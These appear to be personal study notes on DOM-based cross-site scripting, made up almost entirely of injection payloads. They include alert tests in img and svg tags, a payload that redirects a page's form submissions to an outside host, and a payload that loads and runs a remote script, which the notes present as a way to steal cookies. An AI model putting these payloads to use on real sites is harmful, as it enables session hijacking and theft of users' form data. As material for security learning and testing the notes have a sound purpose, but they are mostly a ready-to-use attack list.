XSS DOM: 

DOM runs on the client side,the payloads are process on the browser and not on the server side 

Payloads:

1) "><img=src="aa" onerror="alert(document.domain)">

2) "><svg/onload="alert(document.domain)">

3)Complex Payload using POST method

	"><svg/onload="document.forms[1].action='//sitecom.site/text.php'">


4) PART2: Complex JS payload to steal Cookies:


	- host JS file on the server. 

	- The file has an alert("XSS"); function

	- Craft a payload to connect to it :

		var s= document.createElement('SCRIPT');
		s.src= '//text.site/alert.php';

		document.body.appendChild(s);
		
	
	- Url :
		"><svg/onload="var s= document.createElement('SCRIPT');s.src= 
		 '//text.site/alert.php';document.body.appendChild(s);"

	

5) Image :

	- noImage.jpg' onerror=alert("xss");>
	
	- URL : https://xss-doc.appspot.com/demo/3#imge.jpg' onerror=alert("xss");>

	- 

